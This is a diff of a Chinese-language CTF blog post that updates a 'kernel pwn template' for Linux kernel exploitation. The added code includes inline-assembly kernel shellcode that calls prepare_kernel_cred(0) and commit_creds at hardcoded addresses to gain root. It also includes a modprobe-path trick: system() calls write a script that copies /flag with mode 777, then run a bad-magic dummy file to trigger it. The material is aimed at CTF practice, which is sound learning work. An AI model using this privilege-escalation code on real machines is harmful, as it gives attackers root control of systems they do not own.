@@ -1,7 +1,7 @@
 ---
 layout: post
 tags: [kernel_pwn]
-title: "kernel pwn module"
+title: "kernel pwn template"
 author: wsxk
 date: 2022-10-11
 comments: true
@@ -24,20 +24,21 @@ PS:更新与`2024-11-11`<br>
 ## 2. kernel module<br>
 以目前浅薄的kernel pwn经验，总结了一套kernel pwn时会用到的基本操作，不定时更新~<br>
 ```c
+// gcc -fcf-protection=none -masm=intel -static xxx.c -o xxx
 #include <sys/types.h>
 #include <stdio.h>
 #include <linux/userfaultfd.h>
 #include <pthread.h>
 #include <errno.h>
-#include <unistd.h>
+#include <unistd.h> // read, write
 #include <stdlib.h>
-#include <fcntl.h>
+#include <fcntl.h> // define open, O_RDONLY, O_WRONLY, O_CREAT 
 #include <signal.h>
 #include <poll.h>
 #include <string.h>
 #include <sys/mman.h>
 #include <sys/syscall.h>
-#include <sys/ioctl.h>
+#include <sys/ioctl.h>  // ioctl
 #include <sys/sem.h>
 #include <semaphore.h>
 #include <poll.h>
@@ -77,7 +78,46 @@ void get_root_privilege(){
     int (*commit_creds_ptr)(void *) = commit_creds;
     (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
 }
+
+// kernel shellcode
+__attribute__((naked, noinline)) void privilege_escalation_kernel_shellcode(){
+    __asm__ (
+        "mov rbx, 0xffffffff810895e0;" //prepare_kernel_cred_addr
+        "mov rdi, 0;"
+        "call rbx;"     //prepare_kernel_cred(0)
+        "mov rdi, rax;" 
+        "mov rbx, 0xffffffff810892c0;" //commit_creds_addr
+        "call rbx;"
+        "nop;"
+        "ret;"
+    );
+}
+
+// modprobe
+void environ_set(void){
+    puts("[*] Returned to userland, setting up for fake modprobe");
+    
+    //system("mkdir /tmp");
+    system("echo '#!/bin/sh\ncp /flag /home/hacker/kernel_exploitation/flag\nchmod 777 /home/hacker/kernel_exploitation/flag' > /home/hacker/kernel_exploitation/exp");
+    system("chmod +x /home/hacker/kernel_exploitation/exp");
+
+    system("printf '\xff\xff\xff\xff'  > /home/hacker/kernel_exploitation/dummy");
+    system("chmod +x /home/hacker/kernel_exploitation/dummy");
+    //exit(0);
+}
+
+
+void get_flag(void){
+    puts("[*] Run unknown file");
+    system("cat /proc/sys/kernel/modprobe");
+    system("/home/hacker/kernel_exploitation/dummy");
+
+    puts("[*] Hopefully flag is readable");
+    system("cat /home/hacker/kernel_exploitation/flag");
+    exit(0);
+}
 ```
+
 
 ## 3. 如何找洞?<br>
 有的CTF题目会给一个ko文件（内核驱动模块），可以通过ida逆向分析来挖掘漏洞。那么，如果CTF题目只给了一个linux kernel，你又该如何应对呢？<br>
